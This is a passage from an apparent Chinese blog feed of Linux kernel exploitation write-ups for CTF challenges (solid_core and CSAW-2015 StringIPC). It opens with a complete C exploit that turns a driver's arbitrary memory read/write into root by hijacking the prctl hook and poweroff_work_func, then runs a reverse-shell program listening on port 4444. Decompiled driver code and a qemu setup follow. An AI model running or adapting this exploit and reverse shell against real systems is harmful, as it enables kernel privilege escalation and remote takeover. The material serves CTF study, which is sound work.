class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(<span class="keyword">char</span> *)(addr + i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vdso:%lx\n&quot;</span>, addr);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> selinux_disable_addr = <span class="number">0x2C7BA0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prctl_hook = <span class="number">0x124FD00</span>;</span><br><span class="line"><span class="keyword">size_t</span> order_cmd = <span class="number">0x123D1E0</span>;</span><br><span class="line"><span class="keyword">size_t</span> poweroff_work_func_addr = <span class="number">0x9C4C0</span>;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> offset;</span><br><span class="line">offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>, offset);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/proc/simp1e&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line"><span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">&#123;</span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_base = addr - <span class="number">0x1020000</span>;</span><br><span class="line">prctl_hook += kernel_base;</span><br><span class="line">order_cmd += kernel_base;</span><br><span class="line">poweroff_work_func_addr += kernel_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found kernel base: %lx\n&quot;</span>, kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found prctl_hook: %lx\n&quot;</span>, prctl_hook);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found order_cmd : %lx\n&quot;</span>, order_cmd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found poweroff_work_func_addr: %lx\n&quot;</span>, poweroff_work_func_addr);</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;/reverse_shell\0&quot;</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf) + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd + <span class="number">13</span> - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = prctl_hook - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">20</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">prctl(addr, <span class="number">2</span>, addr, addr, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;nc -l -p 4444&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反弹shell程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> server_ip[] = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> server_port = <span class="number">4444</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(server_port);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">    <span class="keyword">while</span> (connect(sock, (struct sockaddr *)&amp;attacker_addr, <span class="keyword">sizeof</span>(attacker_addr)) != <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目链接：<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl" >http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="HijackPrctl" scheme="https://cv196082.gitee.io/tags/HijackPrctl/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn内存任意读写提升权限[1]</title>
    <link href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/"/>
    <id>https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/</id>
    <published>2022-08-03T09:30:41.000Z</published>
    <updated>2022-08-04T07:51:51.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析通过内存任意读写到提升权限的三种方式</p><p>在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过<code>commit_creds(prepare_kernel_cred(0));</code>以及第一篇提到的直接修改cred结构体，所以这里将入门的其余几条提权方式记录一下</p><p>本文使用题目：<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p><strong>CSAW-2015-StringIPC</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 512M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \</span><br><span class="line">-cpu qemu64,+smep,+smap \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  -enable-kvm  \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><p>首先了开启了smep和smap保护，没有开启kaslr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure><p>init脚本没什么好说的，这里将符号表放到了tmp内</p><p>下面来看驱动的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617364</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">0x10</span>LL) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    count = <span class="number">-16LL</span>;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">    &#123;</span><br><span class="line">        count = alloc_new_ipc_channel(*&amp;write_channel.id, &amp;channel);<span class="comment">// 根据write_channel.id的值申请相应大小的堆块</span></span><br><span class="line">        <span class="keyword">if</span> ( count &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            private_data-&gt;channel = channel;</span><br><span class="line">            LODWORD(write_channel.buf) = channel-&gt;id;<span class="comment">// 返回堆块相应的idx</span></span><br><span class="line">            <span class="keyword">if</span> ( copy_to_user(v5, &amp;write_channel, <span class="number">0x10</span>LL) )</span><br><span class="line">            &#123;</span><br><span class="line">                count = <span class="number">-22LL</span>;</span><br><span class="line">                close_ipc_channel(private_data, channel-&gt;id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x77617365</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">4LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    count = <span class="number">-16LL</span>;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> ( private_data-&gt;channel )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    channel_by_id = get_channel_by_id(write_channel.id, v5);<span class="comment">// 可以看到是根据idx获取channel</span></span><br><span class="line">    count = channel_by_id;</span><br><span class="line">    <span class="keyword">if</span> ( channel_by_id &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    private_data-&gt;channel = channel_by_id;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedSub(&amp;channel_by_id-&gt;ref.refcount.counter, <span class="number">1u</span>) )</span><br><span class="line">        ipc_channel_destroy(&amp;channel_by_id-&gt;ref);<span class="comment">// 释放channel</span></span><br><span class="line">    count = <span class="number">0LL</span>;</span><br><span class="line">    mutex_unlock(&amp;private_data-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617366</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">16LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v11 = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(v11);</span><br><span class="line">    v13 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x77617367</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">16LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v11 = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(v11);</span><br><span class="line">    v13 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_24:</span><br><span class="line">    count = realloc_ipc_channel(write_channel.id, write_channel.buf, v13, v12);</span><br><span class="line">    mutex_unlock(v11);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure><p>可以看到这里会进入到realloc_ipc_channel</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">realloc_ipc_channel</span><span class="params">(ipc_state *state, __int64 id, <span class="keyword">size_t</span> size, <span class="keyword">int</span> grow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// r13d</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v8; <span class="comment">// r12</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    _fentry__(state, id);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    result = get_channel_by_id(state, id);<span class="comment">// 根据idx获取channel</span></span><br><span class="line">    v7 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )<span class="comment">// 变大还是变小</span></span><br><span class="line">            v8 = *(result + <span class="number">16</span>) + id;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v8 = *(result + <span class="number">16</span>) - id;</span><br><span class="line">        v9 = krealloc(*(result + <span class="number">8</span>), v8 + <span class="number">1</span>, <span class="number">37748928LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 )</span><br><span class="line">        &#123;</span><br><span class="line">            *(v7 + <span class="number">8</span>) = v9;</span><br><span class="line">            *(v7 + <span class="number">16</span>) = v8;</span><br><span class="line">            <span class="keyword">if</span> ( _InterlockedSub(v7, <span class="number">1u</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ipc_channel_destroy(v7);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4294967274LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mm\slab_common.c:</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment"> * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment"> * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment"> * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment"> * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment"> * %NULL pointer, the object pointed to is 